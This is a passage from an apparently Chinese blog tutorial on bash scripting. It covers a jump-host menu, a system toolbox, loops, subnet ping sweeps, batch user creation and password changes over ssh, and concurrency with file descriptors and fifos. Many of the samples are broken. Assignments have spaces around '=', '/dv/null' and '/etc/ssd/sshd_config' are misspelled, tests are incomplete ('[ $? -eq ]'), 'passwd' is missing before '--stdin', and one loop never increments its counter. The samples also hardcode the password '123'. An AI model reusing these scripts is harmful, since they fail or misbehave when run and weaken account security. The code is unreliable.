class="line"><span class="built_in">trap</span> <span class="string">""</span> HUP INT OUIT TSTP   <span class="comment"># 捕捉键盘信号，然后啥也不做(^C也退出不了) ,让他登录跳板机不能干别的</span></span><br><span class="line">web1=192.168.0.111</span><br><span class="line">web2=192.168.0.112</span><br><span class="line">web3=192.168.0.113</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;-EOF</span><br><span class="line">+---------------------------+</span><br><span class="line">|       1. web1       |</span><br><span class="line">|       2. web2             |</span><br><span class="line">|       3. mysql1           |</span><br><span class="line">+---------------------------+</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">"\e[1;32minput number:  \e[0m"</span>  <span class="comment"># 显示颜色, -n不换行</span></span><br><span class="line"><span class="built_in">read</span> num</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$num</span>"</span> <span class="keyword">in</span></span><br><span class="line">1)</span><br><span class="line">ssh xps@<span class="variable">$web1</span></span><br><span class="line">;;</span><br><span class="line">2)</span><br><span class="line">ssh xps@<span class="variable">$web2</span></span><br><span class="line">;;</span><br><span class="line">3)</span><br><span class="line">ssh xps@<span class="variable">$mysql1</span></span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line"><span class="string">""</span>)</span><br><span class="line"><span class="comment"># 用户啥也没输入</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">*）</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"error"</span></span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 生产环境</span></span><br><span class="line"><span class="comment">#1. 业务服务器不允许直接连接，允许通过跳板机连接</span></span><br><span class="line"><span class="comment">#2. 业务服务器不允许root用户直接登录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 复杂版jumpserver(对用户行为进行行为/记录)  ---&gt; 使用Python脚本</span></span><br></pre></td></tr></table></figure><p>例子4：实现系统管理工具箱</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 实现系统管理工具箱</span></span><br><span class="line"><span class="comment"># 定义一个函数</span></span><br><span class="line">menu&#123;</span><br><span class="line">cat &lt;&lt;-EOF</span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"><span class="comment">#h. help     #</span></span><br><span class="line"><span class="comment">#f. disk partion     #</span></span><br><span class="line"><span class="comment">#d. filesystem mount #</span></span><br><span class="line"><span class="comment">#m. memory #</span></span><br><span class="line"><span class="comment">#u. system load #</span></span><br><span class="line"><span class="comment">#q .exit #</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line">EOF</span><br><span class="line">&#125;</span><br><span class="line">menu</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Please input[h for help]: "</span> action</span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$action</span>"</span> <span class="keyword">in</span></span><br><span class="line">h)clear; menu;;</span><br><span class="line">f)fdisk -l;;</span><br><span class="line">d)df -Th;;</span><br><span class="line">m)free -m;;</span><br><span class="line">u)uptime;;</span><br><span class="line">q)<span class="built_in">break</span>;;</span><br><span class="line"><span class="string">""</span>) ;;</span><br><span class="line">*)<span class="built_in">echo</span> <span class="string">"error"</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"finish..."</span></span><br></pre></td></tr></table></figure><h5 id="各种符号"><a href="#各种符号" class="headerlink" title="各种符号"></a>各种符号</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">()    <span class="comment"># 在子shell中执行</span></span><br><span class="line">((1&lt;2))   <span class="comment"># C语言风格的比较</span></span><br><span class="line">$(date)           <span class="comment"># touch $(date +%F)_file.txt      先执行里面的命令再执行外面的</span></span><br><span class="line">$(())   <span class="comment"># 运算</span></span><br><span class="line"></span><br><span class="line">&#123;&#125;     <span class="comment"># 集合&#123;1..5&#125;</span></span><br><span class="line"><span class="variable">$&#123;&#125;</span>    <span class="comment"># 变量的引用</span></span><br><span class="line"></span><br><span class="line">[]     <span class="comment"># 条件测试           逻辑符号 [ a -a b  ]</span></span><br><span class="line">[[]]   <span class="comment"># 升级版的。  支持正则匹配 [[ =~ ]]， 逻辑符号 [[ a &amp;&amp; b ]]</span></span><br><span class="line"></span><br><span class="line">$[] <span class="comment"># 整数运算</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####### 执行脚本</span></span><br><span class="line">./01.sh      <span class="comment"># 需要执行权限，在子shell中执行</span></span><br><span class="line">bash 01.sh   <span class="comment"># 不需要执行权限，在子shell中执行</span></span><br><span class="line"></span><br><span class="line">01.sh          <span class="comment"># 需要执行权限，在当前shell中执行</span></span><br><span class="line"><span class="built_in">source</span> 01.sh   <span class="comment"># 不需要执行权限，在当前shell中执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###### 调试脚本</span></span><br><span class="line">sh -n 02.sh    <span class="comment"># 仅调试syntax error</span></span><br><span class="line">sh -vx 02.sh   <span class="comment"># 仅调试的方式执行，查询整个执行过程</span></span><br></pre></td></tr></table></figure><h4 id="四-循环"><a href="#四-循环" class="headerlink" title="四.循环"></a>四.循环</h4><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><blockquote><p>处理固定循环的时候，for有优势</p></blockquote><p>形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 变量名 [ <span class="keyword">in</span> 列表 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">循环体</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>拓展： 查看脚本运行时间:  <code>time ./a.sh</code></p><p>例子1： for循环ping机器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重定向</span></span><br><span class="line">&gt;ip.txt</span><br><span class="line"><span class="comment"># &#123;2..254&#125;  集合，  另一个序列: seq `2 254`</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;2..254&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = 192.168.111.<span class="variable">$i</span></span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null   <span class="comment"># -W等待多少时间</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> | tee -a ping.txt</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;&amp;    <span class="comment"># 用大括号和&amp;, 把整个循环【放到后台】</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span>    <span class="comment"># 等待前面的所有【后台】进程结束，再执行后面的</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"finish !"</span></span><br></pre></td></tr></table></figure><p>例子2：从文件中读取主机，然后ping</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;2..254&#125;  集合，  另一个序列: seq `2 254`</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> `cat ips.txt`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null   <span class="comment"># -W等待多少时间</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up!"</span> </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down!"</span> </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span>    <span class="comment"># 等待前面的所有【后台】进程结束，再执行后门的</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"finish !"</span></span><br></pre></td></tr></table></figure><p>例子3：批量创建账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"input your prefix  &amp; passwd &amp; number : "</span> prefix passwd number</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"user information:</span></span><br><span class="line"><span class="string">---------------------------</span></span><br><span class="line"><span class="string">username: <span class="variable">$passwd</span></span></span><br><span class="line"><span class="string">prefix: <span class="variable">$prefix</span></span></span><br><span class="line"><span class="string">number: <span class="variable">$number</span></span></span><br><span class="line"><span class="string">---------------------------</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Are you sure?[y/n]"</span> action</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$action</span>"</span> = <span class="string">"y"</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"continue ..."</span></span><br><span class="line"><span class="comment"># 然后是接下来的功能</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq -w  <span class="variable">$number</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">user = <span class="variable">$prefix</span>%i</span><br><span class="line">id <span class="variable">$user</span> &amp;&gt;/dv/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"user <span class="variable">$user</span> already exists"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">useradd <span class="variable">$user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$passwd</span>"</span> | --stdin <span class="variable">$user</span>    <span class="comment"># 将密码作为标准输入</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span> is created."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bash -n .sh     检查脚本错误</span></span><br></pre></td></tr></table></figure><p>例子4：批量创建账号（从文件中）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">passwd = 123</span><br><span class="line"><span class="comment"># 必须要输入文件</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"usage: `basename <span class="variable">$0</span>` file"</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 判断输入的是否是文件</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="variable">$1</span> ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"error file"</span></span><br><span class="line"><span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 开始(两列 -- &gt; 把密码和用户名分开)</span></span><br><span class="line"><span class="comment"># 应该：重新定义分隔符</span></span><br><span class="line"><span class="comment"># IFS内部字段分隔符,比如下面的回车</span></span><br><span class="line"><span class="comment"># IFS = $'\n'  </span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> `cat <span class="variable">$1</span>`  <span class="comment"># 位置变量 ,   for对空行不感冒</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment"># 长度为0就跳过</span></span><br><span class="line"><span class="keyword">if</span> $[ <span class="variable">$&#123;#line&#125;</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Nothing to do."</span></span><br><span class="line"><span class="built_in">continue</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">user = `<span class="built_in">echo</span> <span class="string">"<span class="variable">$line</span>"</span> |awk <span class="string">'print &amp;1'</span>`</span><br><span class="line">pass = `<span class="built_in">echo</span> <span class="string">"<span class="variable">$line</span>"</span> |awk <span class="string">'print &amp;2'</span>`</span><br><span class="line">id <span class="variable">$user</span> &amp;&gt;/dv/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"user <span class="variable">$user</span> already exists"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">useradd <span class="variable">$user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$pass</span>"</span> | --stdin <span class="variable">$user</span> &amp;&gt;/dev/null    <span class="comment"># 将密码作为标准输入</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span> is created."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>例子5：批量修改密码(剩下的功能自己完善)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目前：通的放一个文件，不通的放一个文件</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> $(cat ip.txt)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line">ssh <span class="variable">$ip</span> <span class="built_in">echo</span> <span class="string">"123"</span> |passwd --stdin <span class="variable">$user</span>   <span class="comment"># 采用的公钥认证</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> &gt;&gt;success_`date + %F`.txt</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> &gt;&gt;failed_`date + %F`.txt</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> &gt;&gt;failed_`date + %F`.txt</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">&#125;&amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"end!"</span></span><br></pre></td></tr></table></figure><p>例子6：批量修改主机ssh设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="variable">$ip</span> <span class="string">"sed -ri '/~#UseDNS/cUseDNS0 no' /etc/ssd/sshd_config"</span>   <span class="comment"># 搜索并替换(c)</span></span><br></pre></td></tr></table></figure><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><blockquote><p>逐行读取文件的时候，while有优势</p><p>不用像for循环那样担心每一行的空格空行</p><p>所以：读取一个文件中逐行处理，while比for好用</p></blockquote><p>例子1：创建用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以后，读取一个文件中逐行处理，while比for好用</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line:</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment"># 判断用户数是否输入参数</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;#line&#125;</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">continue</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">user = `<span class="built_in">echo</span> <span class="variable">$line</span>|awk <span class="string">'&#123;printf $1&#125;'</span>`</span><br><span class="line">pass = `<span class="built_in">echo</span> <span class="variable">$line</span>|awk <span class="string">'&#123;printf $2&#125;'</span>`</span><br><span class="line">id <span class="variable">$user</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"user <span class="variable">$user</span> already exists"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">useradd <span class="variable">$user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$pass</span>"</span> | --stdin <span class="variable">$user</span> &amp;&gt;/dev/null    <span class="comment"># 将密码作为标准输入</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span> is created."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span> &lt; <span class="variable">$1</span> <span class="comment"># 可以换成位置变量,   从文件里面读取用户名(read不用-p了)</span></span><br><span class="line"><span class="comment"># done &lt; user.tx  #</span></span><br></pre></td></tr></table></figure><p>例子2：while实现连接测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只要ping通就一直ping（【条件为true时候一直执行循环】）</span></span><br><span class="line">ip=192.168.0.5</span><br><span class="line"><span class="keyword">while</span> ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null; <span class="keyword">do</span></span><br><span class="line">sleep 1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down!"</span></span><br></pre></td></tr></table></figure><p>例子3：until 实现连接测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip=192.168.0.5</span><br><span class="line">until ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null; <span class="keyword">do</span></span><br><span class="line">sleep 1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up!"</span></span><br></pre></td></tr></table></figure><ul><li>while 适合写主机下线</li><li>until 适合写主机上线</li></ul><h5 id="until循环"><a href="#until循环" class="headerlink" title="until循环"></a>until循环</h5><p>形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当条件测试为false时候执行循环体</span></span><br><span class="line">until 条件测试</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">循环体</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>例子1：until实现数值运算</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># i=1</span></span><br><span class="line">until [ <span class="variable">$i</span> -gt 100 ]    <span class="comment"># &gt;100</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> sum+=<span class="variable">$i</span></span><br><span class="line"><span class="built_in">let</span> i++</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"sum: <span class="variable">$sum</span>"</span></span><br></pre></td></tr></table></figure><p>例子2：while实现数值运算</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#数值运算：let</span></span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -le 100 ]   <span class="comment"># &lt;=100</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> sum+=<span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"sum: <span class="variable">$sum</span>"</span></span><br></pre></td></tr></table></figure><h5 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h5><p> 并发  —&gt; 多进程  </p><p>之前写的传统并发的方式，多进程（返回是时间是乱序的）  </p><p> <strong>缺点：</strong>有些并发数量太多，会报错</p><p><strong>格式:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;&amp;</span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..254&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">ip=192.168.0.<span class="variable">$i</span></span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up."</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;&amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"执行结束..."</span></span><br></pre></td></tr></table></figure><p><strong>控制并发的数量</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 1). FD(File Descriptors)文件描述符 或 文件句柄 </span></span><br><span class="line"><span class="comment"># 进程使用文件描述符来管理打开的文件（位置： /proc/进程id/fd/）</span></span><br><span class="line"><span class="comment"># $$是当前进程</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 6&lt;&gt; /file1    <span class="comment"># 1.手动指定描述符来 打开文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"111"</span> &gt;&gt; /proc/$$/fd/6    <span class="comment"># 2.写入到了file1</span></span><br><span class="line"><span class="comment"># 3.删除file1</span></span><br><span class="line"><span class="comment"># 4.然后查看文件句柄:</span></span><br><span class="line">ll /proc/$$/fd</span><br><span class="line"><span class="comment"># 会发现6显示删除状态</span></span><br><span class="line"><span class="comment">## 5.把6这个文件拷贝出来变成file1,就又回来了（如果文件句柄没有删除或关闭。就算原文件被删除了，句柄依然在）</span></span><br><span class="line">ls of <span class="comment"># 6.列出打开的文件</span></span><br><span class="line"><span class="built_in">exec</span> 6&lt;&amp;-    <span class="comment"># 7.释放文件的句柄 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 2). 管道</span></span><br><span class="line"><span class="comment">## 匿名管道(一个终端内使用) |</span></span><br><span class="line"><span class="comment">## 跨终端使用   mkfifo</span></span><br><span class="line">mkfifo  /tmp/fifo1   <span 